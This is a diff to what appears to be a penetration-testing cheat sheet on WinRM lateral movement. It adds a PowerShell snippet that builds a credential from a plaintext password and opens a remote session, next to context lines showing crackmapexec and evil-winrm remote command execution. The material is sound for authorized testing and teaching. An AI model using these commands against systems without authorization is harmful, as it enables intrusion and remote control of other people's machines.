@@ -30,7 +30,7 @@ crackmapexec winrm <IP> -u <user> -p <password> -x "$(Get-WMIObject -class Win32
 {% endtab %}
 
 {% tab title="Windows" %}
-We can use PowerShell's `Invoke-Command` to remotely execute a command on the target over WinRM.
+We can use the PowerShell `Invoke-Command` cmdlet to remotely execute a command on the target over WinRM.
 
 ```powershell
 #Create Powershell PSCredential object
@@ -62,6 +62,21 @@ Invoke-Command -ComputerName <TARGET> -FilePath C:\path\to\script\file -credenti
 
 ```bash
 evil-winrm -u <user> -p <password> -i <IP>
+```
+{% endtab %}
+
+{% tab title="Windows" %}
+We can use Powershell's `Enter-PSSession` cmdlet to start an interactive session with a remote computer.
+
+```powershell
+#Create Powershell PSCredential object
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+
+# Start a remote powershell session
+Enter-PSSession -ComputerName <TARGET> -Credential $credential
 ```
 {% endtab %}
 {% endtabs %}
